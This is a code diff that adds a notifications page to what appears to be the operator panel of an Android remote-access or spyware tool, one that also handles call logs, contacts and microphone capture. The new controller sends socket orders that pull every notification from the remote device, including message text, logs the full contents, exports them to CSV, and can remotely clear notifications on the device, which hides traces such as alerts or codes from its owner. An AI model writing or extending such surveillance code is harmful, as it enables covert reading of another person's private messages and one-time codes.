@@ -38,6 +38,10 @@ app.config(function ($routeProvider) {
             templateUrl: "./views/callsLogs.html",
             controller: "CallsCtrl"
         })
+        .when("/notifications", {
+            templateUrl: "./views/notifications.html",
+            controller: "NotificationsCtrl"
+        })
         .when("/contacts", {
             templateUrl: "./views/contacts.html",
             controller: "ContCtrl"
@@ -1290,6 +1294,167 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
 
 
 });
+//-----------------------Notifications Controller (notifications.htm)------------------------
+// Notifications controller
+app.controller("NotificationsCtrl", function ($scope, $rootScope) {
+    $NotificationsCtrl = $scope;
+    $NotificationsCtrl.notificationsList = [];
+    var notifications = CONSTANTS.orders.notifications;
+
+    $NotificationsCtrl.$on('$destroy', () => {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(notifications);
+    });
+
+    $NotificationsCtrl.load = 'loading';
+    $rootScope.Log('Get Notifications list..');
+    socket.emit(ORDER, { order: notifications });
+
+    $NotificationsCtrl.barLimit = 50;
+    $NotificationsCtrl.increaseLimit = () => {
+        $NotificationsCtrl.barLimit += 50;
+    }
+
+    $NotificationsCtrl.searchFilter = function (notification) {
+        if (!$NotificationsCtrl.searchQuery) return true;
+
+        var q = $NotificationsCtrl.searchQuery.toLowerCase();
+        var appName = notification.appName ? notification.appName.toLowerCase() : '';
+        var packageName = notification.packageName ? notification.packageName.toLowerCase() : '';
+        var title = notification.title ? notification.title.toLowerCase() : '';
+        var text = notification.text ? notification.text.toLowerCase() : '';
+
+        return appName.includes(q) || packageName.includes(q) || title.includes(q) || text.includes(q);
+    };
+
+    $NotificationsCtrl.refreshNotifications = () => {
+        $NotificationsCtrl.load = 'loading';
+        $rootScope.Log('Refreshing notifications list..');
+        socket.emit(ORDER, { order: notifications });
+    };
+
+    $NotificationsCtrl.clearNotifications = () => {
+        if ($NotificationsCtrl.notificationsList.length == 0) return;
+
+        $rootScope.Log('Clearing all notifications..');
+        // Gửi lệnh clear notifications đến device
+        socket.emit(ORDER, { order: 'x0000clearNt' });
+
+        // Clear local list
+        $NotificationsCtrl.notificationsList = [];
+        $NotificationsCtrl.notificationsSize = 0;
+        $NotificationsCtrl.$apply();
+    };
+
+    $NotificationsCtrl.clearSingleNotification = (notificationKey) => {
+        if (!notificationKey) return;
+
+        $rootScope.Log('Clearing single notification: ' + notificationKey);
+        // Gửi lệnh clear notification cụ thể đến device
+        socket.emit(ORDER, { order: 'x0000clearSingleNt', notificationKey: notificationKey });
+
+        // Xóa khỏi local list
+        var index = $NotificationsCtrl.notificationsList.findIndex(n => n.notificationKey === notificationKey);
+        if (index > -1) {
+            $NotificationsCtrl.notificationsList.splice(index, 1);
+            $NotificationsCtrl.notificationsSize = $NotificationsCtrl.notificationsList.length;
+            $NotificationsCtrl.$apply();
+        }
+    };
+
+    // Listen for clear notifications response
+    socket.on('x0000clearNt', (data) => {
+        if (data.status) {
+            $rootScope.Log('Notifications cleared successfully', CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $rootScope.Log('Failed to clear notifications', CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    // Listen for clear single notification response
+    socket.on('x0000clearSingleNt', (data) => {
+        if (data.status) {
+            $rootScope.Log('Single notification cleared successfully: ' + data.notificationKey, CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $rootScope.Log('Failed to clear single notification: ' + data.message, CONSTANTS.logStatus.FAIL);
+        }
+    });
+
+    $NotificationsCtrl.SaveNotifications = () => {
+        if ($NotificationsCtrl.notificationsList.length == 0) return;
+
+        var csvRows = [];
+        csvRows.push('App Name,Package Name,Title,Text,Post Time,Is Ongoing,Is Clearable');
+
+        for (var i = 0; i < $NotificationsCtrl.notificationsList.length; i++) {
+            var notification = $NotificationsCtrl.notificationsList[i];
+            csvRows.push([
+                notification.appName || 'N/A',
+                notification.packageName || 'N/A',
+                notification.title || 'N/A',
+                notification.text || 'N/A',
+                notification.postTime || 'N/A',
+                notification.isOngoing ? 'Yes' : 'No',
+                notification.isClearable ? 'Yes' : 'No'
+            ].join(','));
+        }
+
+        var csvStr = csvRows.join("\n");
+        var csvPath = path.join(downloadsPath, "Notifications_" + Date.now() + ".csv");
+        $rootScope.Log("Saving Notifications List...");
+        fs.outputFile(csvPath, csvStr, (error) => {
+            if (error)
+                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log("Notifications List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
+        });
+    };
+
+    socket.on(notifications, (data) => {
+        if (data.notificationsList) {
+            $NotificationsCtrl.load = '';
+            $rootScope.Log('Notifications list arrived', CONSTANTS.logStatus.SUCCESS);
+            $NotificationsCtrl.notificationsList = data.notificationsList;
+            $NotificationsCtrl.notificationsSize = data.notificationsList.length;
+
+            // Log chi tiết từng notification
+            console.log("=== Notifications Received ===");
+            data.notificationsList.forEach((nt, idx) => {
+                console.log(`#${idx + 1}`, {
+                    appName: nt.appName,
+                    packageName: nt.packageName,
+                    title: nt.title,
+                    text: nt.text,
+                    bigText: nt.bigText,
+                    subText: nt.subText,
+                    infoText: nt.infoText,
+                    tickerText: nt.tickerText,
+                    summaryText: nt.summaryText,
+                    postTime: nt.postTime,
+                    isOngoing: nt.isOngoing,
+                    isClearable: nt.isClearable,
+                    notificationId: nt.notificationId,
+                    notificationKey: nt.notificationKey,
+                    actions: nt.actions
+                });
+            });
+            console.log("=== End Notifications ===");
+
+            $NotificationsCtrl.$apply();
+        }
+    });
+
+    // Listen for real-time notifications updates
+    ipcRenderer.on('SocketIO:NotificationsReceived', (event, data) => {
+        if (data.notifications) {
+            $NotificationsCtrl.notificationsList = data.notifications;
+            $NotificationsCtrl.notificationsSize = data.notifications.length;
+            $NotificationsCtrl.$apply();
+        }
+    });
+
+});
+
 //-----------------------Mic Controller (mic.htm)------------------------
 // Mic controller
 app.controller("MicCtrl", function ($scope, $rootScope) {
